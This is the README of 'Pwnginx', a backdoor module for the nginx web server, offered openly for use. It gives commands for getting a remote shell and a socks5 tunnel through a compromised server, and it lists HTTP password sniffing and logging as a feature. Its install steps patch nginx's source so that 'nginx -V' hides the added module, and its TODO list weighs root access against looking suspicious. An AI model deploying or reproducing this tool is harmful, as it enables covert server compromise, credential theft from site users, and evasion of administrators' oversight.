#[ Pwnginx ] - Pwn nginx

Copyleft by t57root @ openwill.me

&lt;t57root@gmail.com>  [www.HackShell.net](http://www.hackshell.net/)

Usage:

Get shell access via the nginx running @ [ip]:[port]

    ./pwnginx shell [ip] [port] [password]

Get a socks5 tunnel listening at [socks5ip]:[socks5port]

    ./pwnginx socks5 [ip] [port] [password] [socks5ip] [socks5port]


###Features:
    
* Remote shell access

* Socks5 tunneling via existing http connection

* Http password sniffing & logging

###INSTALL:

* Compile the client:

    $ cd client;make

* Edit source to hidden configure arguments:

    $ vim src/core/nginx.c
    
    Modify the `configure arguments` line into: `configure arguments: --prefix=/opt/nginx\n");` (original configure arguments shown in the result of `nginx -V`)

* Recompile nginx:

    $ cd /path/to/nginx/source; ./configure --prefix=/opt/nginx --add-module=/path/to/pwnginx/module && make (There is no need to run `make install`)

    $ sudo cp -f objs/nginx /path/to/nginx/sbin/nginx

* Restart nginx

    $ sudo killall nginx && /path/to/nginx/sbin/nginx


###TODO:

* Pack communication traffic into HTTP protocol

* Full pty support

* Shell with root privilege(? There must be another stand-alone 'nginx: master process' running under root to support this function. Maybe that's too suspicious. Being considered.)
